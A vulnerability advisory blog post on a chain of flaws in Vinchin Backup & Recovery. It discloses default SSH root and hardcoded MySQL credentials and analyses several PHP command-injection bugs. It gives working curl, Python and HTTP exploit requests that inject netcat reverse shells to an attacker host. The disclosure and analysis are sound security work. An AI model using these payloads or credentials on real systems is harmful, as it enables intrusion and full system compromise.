+++
title = "Vinchin Backup & Recovery: CVE-2024-22899 to CVE-2024-22903"
url = "2024/01/vinchin-backup-rce-chain"
author = "Valentin Lobstein"
author_link = "https://twitter.com/Chocapikk_"
description = "Advisory Overview: CVE-2024-22899 to CVE-2024-22903 in Detail"
tags = [
    "vulnerability",
    "research",
    "LeakIX",
]
date = 2024-01-25T21:23:33+01:00
categories = [
    "vulnerability",
    "research",
    "LeakIX"
]
image = "cover.png"
+++

## Table of Contents:

- [Default SSH Root Credentials (CVE-2024-22902)](#default-ssh-root-credentials-cve-2024-22902)
- [Hardcoded Database Credentials and Configuration Flaw (CVE-2024-22901)](#hardcoded-database-credentials-and-configuration-flaw-cve-2024-22901)
- [Post-Authentication Remote Code Execution (RCE)](#post-authentication-remote-code-execution-rce)
- [Exploitation Methods](#exploitation-methods)
  - [A. Webdriver Chrome Simulation:](#a-webdriver-chrome-simulation)
  - [B. `curl` Method (using setNetworkCardInfo as example):](#b-curl-method-using-setnetworkcardinfo-as-example)
- [Deep Dive into the `setNetworkCardInfo` Function Vulnerability (CVE-2024-22900)](#deep-dive-into-the-setnetworkcardinfo-function-vulnerability-cve-2024-22900)
- [Deep Dive into the `syncNtpTime` Function Vulnerability (CVE-2024-22899)](#deep-dive-into-the-syncntptime-function-vulnerability-cve-2024-22899)
- [Deep Dive into the `deleteUpdateAPK` Function Vulnerability (CVE-2024-22903)](#deep-dive-into-the-deleteupdateapk-function-vulnerability-cve-2024-22903)
- [Deep Dive into the `getVerifydiyResult` Function Vulnerability (CVE-2024-25228)](#deep-dive-into-the-getverifydiyresult-function-vulnerability-cve-2024-25228)
- [Full Exploit Chain](#full-exploit-chain)

![](/vinchin-backup-rce-chain-2024/vinchin_stable.png)

### Introduction:

Vinchin Backup and Recovery is a leading data protection solution employed by
large enterprises and is extensively utilized across diverse environments,
including virtual, physical, and cloud platforms. While its vast feature set
caters to the diverse needs of these big corporations, it is not immune to
security vulnerabilities. A meticulous analysis has recently exposed a series of
critical flaws that can present significant risks to its users. For more details
on their product and offerings, you can visit their official website at
[vinchin.com](https://www.vinchin.com/).

---

### Collaboration and Acknowledgment:

Our discovery and subsequent analysis of these critical vulnerabilities in
Vinchin Backup and Recovery was a collective effort. It is pivotal to highlight
the collaboration with the research team at **LeakIX**. Their expertise,
rigorous methodologies, and unwavering dedication significantly contributed to
uncovering and understanding these vulnerabilities. This endeavor underscores
the importance of teamwork, shared knowledge, and mutual support in the
cybersecurity domain.

Thanks to this synergized approach, we were not only able to identify these
vulnerabilities but also to understand their implications deeply and propose
viable mitigation steps. We extend our gratitude to the researchers at LeakIX
and everyone involved in this project. Their shared vision for a safer digital
landscape and commitment to ethical hacking practices have made this discovery
possible.

## So let's start!

### Default SSH Root Credentials (CVE-2024-22902)

Vinchin's implementation comes equipped with default root credentials,
facilitating remote access:

- **Default Credentials**:
  - Username: `root`
  - Password: `Backup@3R`

**Associated Risks**:

- Allowing **SSH root logins with a password** is a major security flaw.
- The default password is **publicly documented**, making it a low-hanging fruit
  for attackers.
- The installation workflow **does not** emphasize **the necessity of updating
  this default password**.

---

### Hardcoded Database Credentials and Configuration Flaw (CVE-2024-22901)

Vinchin's application employs a static set of credentials for its MySQL
database:

- **Database Credentials**:
  - Username: `vinchin`
  - Password: `yunqi123456`

**Associated Risks**:

- Potential exposure of the **MySQL port to the public**.
- **Absence of hostname-based restrictions** for database logins.
- Attackers could potentially **alter the database**, such as **creating rogue
  admin users**, granting them **unauthorized system privileges**.

### Post-Authentication Remote Code Execution (RCE)

Some functions within `/api/app/platform/SystemHandler.class.php` and
`/api/app/platform/ManoeuvreHandler.class.php` has been identified as being
susceptible to **Remote Code Execution**.

### Exploitation Methods:

#### A. Webdriver Chrome Simulation:

Given that the form data is encrypted using **JSEncrypt** and JavaScript is
responsible for all XHR requests, executing a direct exploit becomes a complex
task. A simpler, more intuitive method to simulate this exploit involves using a
**Chrome WebDriver**. This technique simulates natural interactions with the web
interface, allowing for circumvention of encryption and request management
barriers.

For an effective demonstration of this method, refer to the provided image:

![Vinchin Exploit Demonstration via WebDriver](/vinchin-backup-rce-chain-2024/poc.png)

#### B. `curl` Method (using setNetworkCardInfo as example):

For more extensive and automated exploitation scenarios, the `curl` method can
be invaluable. While it might be more intricate than the WebDriver approach, it
holds merit in scenarios requiring mass automation. The detailed `curl` exploit
method is as follows:

```bash
curl -i -s -k -X POST \
-H 'Host: [IP]' \
-H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/118.0' \
-H 'Accept: */*' \
-H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' \
-H 'Origin: [URL]' \
-H 'Connection: close' \
-b 'BackupSystem=[COOKIE_VALUE]' \
--data 'p={"nodeuuid":"[NODEUUID_VALUE]","NAME":"; nc -e /bin/sh [ATTACKER_IP] [ATTACKER_PORT]","IPADDR":"[IP]","NETMASK":"","GATEWAY":"","DNS":"","PREFIX":""}' \
[URL]/api/?m=8&f=setNetworkCardInfo
```

- Here an example how you could do the exploit in Python in this way :

```python
import requests
import json

cookies = {
    'BackupSystem': 'v108v9nv0akfqkgehl7h9e130f',
}

headers = {
    'Host': '192.168.1.23',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/118.0',
    'Accept': '*/*',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'Origin': 'https://192.168.1.23',
    'Connection': 'close',
}

payload = {
    "nodeuuid": "87de2178-38f0-45c7-8a06-b524b6c5940f",
    "NAME": "; /bin/nc -e /bin/bash 192.168.1.5 1338",
    "IPADDR": "192.168.1.23",
    "NETMASK": "",
    "GATEWAY": "",
    "DNS": "",
    "PREFIX": ""
}

data = {
    'm': '8',
    'f': 'setNetworkCardInfo',
    'p': json.dumps(payload)
}

print(data)

response = requests.post(
    "https://192.168.1.23/api/",
    cookies=cookies,
    headers=headers,
    data=data,
    verify=False,
)
print(response.text)
```

---

### Deep Dive into the `setNetworkCardInfo` Function Vulnerability (CVE-2024-22900)

![](/vinchin-backup-rce-chain-2024/setNetworkCardInfo.png)

#### Vulnerability Overview:

The `setNetworkCardInfo` function in Vinchin Backup and Recovery's software has
a significant security vulnerability. This function is designed to update
network card information.

#### Function Analysis:

**Function Prototype**:

```php
public function setNetworkCardInfo($params)
```

1. **Parameter Collection**: The function retrieves the `NAME` parameter from
   the request and stores it in `$name`:

   ```php
   $name = $params['NAME'];
   ```

2. **Device Name Assignment**: The `NAME` parameter is assigned to the `DEVICE`
   key in `$params`. This means the network device's name is controlled by the
   user-supplied `NAME` value:

   ```php
   $params['DEVICE'] = $name;
   ```

3. **Constructing Network Card Path**: The function constructs a file path that
   includes the device name provided in `NAME`:

   ```php
   $networkCardPath = Xphp::$_config['NETWORKCARD']['path'] . Xphp::$_config['NETWORKCARD']['prefix'] . $name;
   ```

   It uses the `Xphp::$_config['NETWORKCARD']` configuration to form this path.

4. **Executing Command**: The constructed path is used in a command to read
   network card configuration file contents:
   ```php
   $cmd = "cat " . $networkCardPath;
   exec($cmd, $info);
   ```
   The vulnerability arises here as the `exec` function is used to execute a
   command containing user-controlled input, leading to a command injection
   vulnerability.

#### Exploitation:

This vulnerability allows an attacker to inject commands via the `NAME`
parameter.

#### Exploit Example:

An attacker can craft a POST request to exploit this vulnerability:

```http
POST /api/ HTTP/1.1
Host: [Vinchin Server IP]
Origin: [Vinchin Server URL]
Cookie: [Session Cookie]
Content-Type: application/x-www-form-urlencoded; charset=UTF-8

m=8&f=setNetworkCardInfo&p={"NAME":";nc -e /bin/bash 192.168.1.5 1338","other_params":"..."}
```

In this request, the attacker has appended a command
(`nc -e /bin/bash 192.168.1.5 1338`) to the `NAME` parameter to open a reverse
shell to the attacker's machine.

#### Conclusion:

The `setNetworkCardInfo` function's vulnerability highlights the dangers of
using user-supplied input in system commands without proper validation and
sanitization. This vulnerability poses a severe risk and can lead to total
system compromise.

Vinchin should prioritize fixing this vulnerability by implementing robust input
validation mechanisms. Users of Vinchin Backup and Recovery should be vigilant
and apply any provided patches or updates to mitigate this security risk.

---

### Deep Dive into the `syncNtpTime` Function Vulnerability (CVE-2024-22899)

![](/vinchin-backup-rce-chain-2024/syncNtpTime.png)

### Vulnerability Overview:

The `syncNtpTime` function in Vinchin Backup and Recovery's
`SystemHandler.class.php` file presents a critical vulnerability. This function
is intended for synchronizing the system's time with an NTP (Network Time
Protocol) server.

### Function Analysis:

**Function Prototype**:

```php
public function syncNtpTime($params)
```

1. **Parameter Handling**: The function accepts an array `$params`, extracting
   the `ntphost` key:

   ```php
   $ntphost = $params['ntphost'];
   ```

2. **Initial NTP Service Stop Command**: It begins by stopping the NTP service
   to allow manual synchronization:

   ```php
   $cmd = "systemctl stop ntpd";
   ```

3. **Manual Synchronization Command**: The critical part is where it attempts to
   synchronize the system's time manually:

   ```php
   $cmd = "ntpdate " . $ntphost;
   ```

   Here, the `$ntphost` variable, derived from user input, is concatenated
   directly into the command line string. This introduces a command injection
   vulnerability since there are no checks or sanitization on the `ntphost`
   parameter.

4. **Execution of Command**: The concatenated command is executed:
   ```php
   exec($cmd, $info);
   ```

### Exploitation:

The vulnerability can be exploited by injecting commands into the `ntphost`
parameter. When the function concatenates this parameter into the command line,
the injected command is executed with the privileges of the web server's
process.

#### Exploit Example:

An attacker can send a specially crafted HTTP POST request to trigger this
vulnerability:

```http
POST /api/ HTTP/1.1
Host: [Vinchin Server IP]
Origin: [Vinchin Server URL]
Cookie: [Session Cookie]
Content-Type: application/x-www-form-urlencoded; charset=UTF-8

m=8&f=syncNtpTime&p={"ntphost":"time.nist.gov;nc -e /bin/bash 192.168.1.5 1338"}
```

In this request, the attacker has appended a command
(`nc -e /bin/bash 192.168.1.5 1338`) to the `ntphost` parameter. This command
sets up a reverse shell to the attacker's machine (`192.168.1.5`), allowing
remote access to the server running the Vinchin Backup and Recovery system.

### Conclusion:

The `syncNtpTime` function's vulnerability is a classic example of command
injection. The lack of proper input validation and sanitization allows an
attacker to execute arbitrary commands on the server. This poses a severe
security risk, potentially leading to full system compromise.

It is imperative for Vinchin to address this vulnerability promptly by
implementing rigorous input validation and sanitization mechanisms in their
codebase. Users of Vinchin Backup and Recovery should apply any patches or
updates provided by Vinchin to mitigate this risk.

---

### Deep Dive into the `deleteUpdateAPK` Function Vulnerability (CVE-2024-22903)

![](/vinchin-backup-rce-chain-2024/deleteUpdateAPK.png)

#### Vulnerability Overview:

The `deleteUpdateAPK` function within Vinchin Backup and Recovery's software
contains a critical security vulnerability. This function is intended to delete
an APK file based on provided parameters.

#### Function Analysis:

**Function Prototype**:

```php
public function deleteUpdateAPK($params)
```

1. **Parameter Extraction**: The function retrieves `md5` and `file_name` from
   the `$params` array:

   ```php
   $md5 = $params['md5'];
   $file_name = $params['file_name'];
   ```

2. **File Name Check**: The function checks if the `file_name` is empty and
   returns an error message if it is:

   ```php
   if (empty($file_name)) {
       // Return an error message
   }
   ```

3. **Command Construction**: It constructs a command to remove the specified
   file and its temporary counterpart:

   ```php
   $cmd = "rm -rf " . $path;
   $cmd_tmp = "rm -rf " . $path_tmp;
   ```

4. **Command Execution**: The commands are executed using the `exec` function:

   ```php
   exec($cmd);
   exec($cmd_tmp);
   ```

   The critical vulnerability here is the direct use of the `file_name`
   parameter in the command without any sanitization or validation. This opens
   the door for an attacker to inject additional commands.

#### Exploitation:

An attacker can exploit this vulnerability by injecting commands through the
`file_name` parameter.

#### Exploit Example:

An attacker can send a POST request with a specially crafted `file_name`
parameter:

```http
POST /api/ HTTP/1.1
Host: [Vinchin Server IP]
Origin: [Vinchin Server URL]
Cookie: [Session Cookie]
Content-Type: application/x-www-form-urlencoded; charset=UTF-8

m=8&f=deleteUpdateAPK&p={"md5":"dummy_md5","file_name":";nc -e /bin/bash 192.168.1.5 1338"}
```

In this request, the attacker appends a reverse shell command
(`nc -e /bin/bash 192.168.1.5 1338`) to the `file_name` parameter, leading to
its execution on the server.

#### Conclusion:

The `deleteUpdateAPK` function's vulnerability is another instance of command
injection due to insufficient input validation. It allows an attacker to execute
arbitrary commands on the server, potentially leading to full system compromise.

Vinchin should urgently address this vulnerability by implementing strict input
validation and command execution controls. Users of Vinchin Backup and Recovery
should apply any available security updates to mitigate this risk.

---

### Deep Dive into the `getVerifydiyResult` Function Vulnerability (CVE-2024-25228)

![](/vinchin-backup-rce-chain-2024/getVerifydiyResult.png)

#### Vulnerability Overview:

In Vinchin Backup and Recovery's `ManoeuvreHandler.class.php` file, the
`getVerifydiyResult` function contains a critical command injection
vulnerability. This function is intended to validate either IP addresses or web
resources, depending on the value of the `type` parameter.

#### Function Analysis:

**Function Prototype**:

```php
public function getVerifydiyResult($params)
```

1. **Parameter Handling**: The function processes an input array `$params`,
   focusing on the keys `type` and `value`:

   ```php
   $type = intval($params['type']);
   $value = $params['value'];
   ```

2. **Critical Logic with `type` Parameter**: The function uses a `switch`
   statement to determine the validation method:

   ```php
   switch ($type) {
       case $verifyType['IP']:  // where $verifyType['IP'] is typically 1
           $verifyResult = $this->verifyPing($value);
           break;
       case $verifyType['WEB']:
           $verifyResult = $this->verifyWeb($value);
           break;
   }
   ```

   When `type` equals 1 (`$verifyType['IP']`), the `verifyPing` method is
   invoked.

3. **Command Injection in `verifyPing`**: The `verifyPing` method includes a
   direct execution of the `ping` command using `$value`:

   ```php
   exec("ping -c 1" . $value, $outcome, $status);
   ```

   Due to the lack of sanitization or validation of `$value`, a command
   injection vulnerability is introduced.

#### Exploitation:

An attacker can exploit this vulnerability by setting `type` to 1 and injecting
malicious commands into the `value` parameter.

#### Exploit Example:

An attacker sends a POST request with a crafted payload:

```http
POST /api/ HTTP/1.1
Host: [Vinchin Server IP]
Origin: [Vinchin Server URL]
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Cookie: [Session Cookie]

m=14&f=getVerifydiyResult&p={"type":"1","value":"127.0.0.1;sleep+5"}
```

In this payload, `sleep+5` is appended to the IP address, demonstrating a
successful command injection by causing the server to pause for 5 seconds.

#### Conclusion:

The `getVerifydiyResult` function in Vinchin Backup and Recovery showcases a
severe security risk, where unvalidated user input in the `value` parameter,
combined with a specific `type` value, leads to command injection. This
vulnerability could enable attackers to execute arbitrary commands on the
system, potentially leading to full compromise.

Immediate remediation actions, such as implementing input validation and
sanitization in the `getVerifydiyResult` function, are essential to mitigate
this risk. Users should also apply any patches or updates provided by Vinchin.

---

### Full Exploit Chain:

1. Attackers, by harnessing the hardcoded database credentials, can **infiltrate
   the MySQL database**.
2. Such access empowers them to **modify user data** or **instantiate new
   administrative users illicitly**.
3. With validated access to the web console, they can then leverage the **RCE
   vulnerability**, resulting in total system compromise.

In summation, the Vinchin Backup and Recovery systems are at risk from a series
of intertwined vulnerabilities - **hardcoded credentials**, **database
misconfigurations**, **and direct command execution flaws**. It's of utmost
importance for system users and administrators to be cognizant of these
vulnerabilities and to act swiftly in applying remediations.
